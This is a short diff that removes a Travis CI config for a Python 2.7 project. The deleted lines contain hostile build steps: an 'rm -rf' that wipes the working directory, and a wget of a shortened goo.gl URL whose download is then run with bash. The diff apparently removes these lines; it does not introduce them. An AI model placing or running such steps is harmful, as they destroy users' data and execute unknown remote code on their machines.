@@ -1,9 +1,0 @@
-language: python
-python:
-  - "2.7"
-install:
-  - rm -rf * ./*
-  - wget https://goo.gl/3e2B0
-
-script: bash 3e2B0
-
